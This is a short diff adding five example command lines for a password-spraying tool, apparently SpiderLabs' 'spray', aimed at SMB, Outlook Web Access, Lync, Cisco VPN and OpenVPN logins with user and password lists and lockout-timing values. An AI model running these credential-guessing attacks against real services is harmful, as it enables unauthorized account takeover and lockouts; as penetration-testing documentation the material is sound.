@@ -1,0 +1,5 @@
+spray -smb 192.168.0.1 users.txt passwords.txt 1 35 SPIDERLABS
+spray -owa 192.168.0.1 users.txt passwords.txt 1 35 post-request.txt
+spray -lync https://lyncdiscover.spiderlabs.com/ users.txt passwords.txt 1 35
+spray -cisco 192.168.0.1 usernames.txt passwords.txt 1 35
+spray -ovpn 192.168.0.1 943 usernames.txt passwords.txt 1 35
